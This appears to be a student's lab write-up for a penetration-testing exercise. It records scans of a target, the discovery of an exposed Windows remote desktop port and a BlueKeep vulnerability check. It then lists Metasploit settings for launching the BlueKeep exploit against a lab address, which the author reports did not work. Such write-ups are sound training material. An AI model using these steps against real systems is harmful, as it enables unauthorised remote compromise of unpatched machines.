# Exercise 2: Tel-Aldruhn

**Note: followed John-William Tilbury’s walkthrough as I could not figure out an entry point**

Run full scan:

![Text Description automatically generated](media/a99a0ef8fa161c0beac65ce2e3971d42.png)

Run nikto on port 80. Meanwhile, visit webpage

![](media/f84cdf37ebe7952803995c9d24c98638.png)

No robots.txt webpage

dirb & nikto returns nothing

![Text Description automatically generated](media/04d5bacceb07bd93771c4f148da94726.png)

![A computer screen capture Description automatically generated with medium confidence](media/d5c986075f3d72e87d4f670a08945244.png)

Port 3389 Windows remote desktop protocol. Connect using remmina: sudo apt install remmina

![](media/9c1ca40c0c5fe664a1de51cc24da63aa.png)

Check for bluekeep vulnerability![](media/1bfdee3627a88d881d1a8ee38a2c2fd5.png)

Exploit using bluekeep

use 0  
set rhost 192.168.2.9  
set lhost tun0  
set groomsize 50  
set target 1

![](media/b89f512ed2fb66eb113340ae1c6ea8e8.png)Seems like something wrong with .9 machine itself. Perhaps a reset is needed. Otherwise the exploit should’ve worked
